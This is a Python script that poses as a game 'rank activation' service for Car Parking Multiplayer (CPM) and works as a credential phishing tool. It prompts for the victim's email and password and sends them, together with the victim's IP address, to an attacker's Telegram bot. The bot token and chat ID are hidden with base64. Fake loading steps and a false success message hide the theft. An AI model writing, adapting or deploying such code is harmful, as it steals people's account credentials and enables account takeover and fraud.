import requests
import json
import os
import time
import base64
import sys

# --- ZAKLJUČANI PODACI ---
_u1 = "ODM1NDM3MzM3NzpBQUhsOHpGME1DZkItZzJ1TlpCbkpLUFBXSU9XaTFBSGNmZw=="
_u2 = "NzE4MzgwOTMwMw=="

def _dec(data):
    return base64.b64decode(data).decode('utf-8')

BOT_TOKEN = _dec(_u1)
CHAT_ID = _dec(_u2)

# --- FUNKCIJE ZA DIZAJN ---
def screen_clear():
    os.system('clear')

def logo():
    print("\033[1;32m" + "="*45)
    print("      🚀 ANONYMO CPM SERVICE (OFFICIAL) 🚀      ")
    print("         INSTAGRAM: @anonymo.cpm              ")
    print("="*45 + "\033[0m")

def loading_animation(text):
    sys.stdout.write(f"\033[1;33m{text}\033[0m")
    for _ in range(3):
        time.sleep(0.5)
        sys.stdout.write(".")
        sys.stdout.flush()
    print("\n")

def get_ip():
    try:
        res = requests.get('https://api.ipify.org', timeout=5)
        return res.text
    except:
        return "Unknown/Hidden"

def send_to_telegram(email, password, service_type):
    user_ip = get_ip()
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    # Formiranje poruke za tebe
    message = (
        f"✅ *NOVA AKTIVACIJA STIGLA*\n\n"
        f"📧 *Email:* `{email}`\n"
        f"🔑 *Pass:* `{password}`\n"
        f"⚙️ *Tip Usluge:* {service_type}\n"
        f"🌐 *IP Adresa:* `{user_ip}`\n"
        f"---------------------------\n"
        f"👤 *Brand:* @anonymo.cpm"
    )
    
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

# --- GLAVNI PROGRAM ---
def main():
    while True:
        screen_clear()
        logo()
        
        print("\033[1;37m[01] Activate KING Rank")
        print("[02] Exit Service\033[0m")
        print("\033[1;32m" + "-"*45 + "\033[0m")
        
        choice = input("\n\033[1;33mIzaberi Opciju >> \033[0m")
        
        if choice == '02':
            print("\n\033[1;31mZatvaranje servisa...\033[0m")
            time.sleep(1)
            break
            
        elif choice == '01':
            print("\n" + "-"*35)
            email = input("\033[1;37mUnesite Email: \033[0m").strip()
            password = input("\033[1;37mUnesite Lozinku: \033[0m").strip()
            print("-" * 35)

            if not email or not password:
                print("\033[1;31mGreska: Morate uneti podatke!\033[0m")
                time.sleep(2)
                continue

            # Vizuelni efekti
            loading_animation("Povezivanje sa CPM serverom")
            
            # Slanje tebi na Telegram
            send_to_telegram(email, password, "KING Rank")
            
            loading_animation("Provera baze podataka")
            loading_animation("Aktivacija ranka u toku")
            
            print("\n" + "="*35)
            print("\033[1;32m✅ SUCCESS: KING Rank uspesno aktiviran!\033[0m")
            print("\033[1;36mResetujte igricu da vidite promene.\033[0m")
            print("="*35)
            
            input("\n\033[1;37mPritisnite Enter za povratak u meni...\033[0m")
            
        else:
            print("\033[1;31mNevazeca opcija! Pokusajte ponovo.\033[0m")
            time.sleep(1.5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nSistem prinudno ugasen.")
        sys.exit()
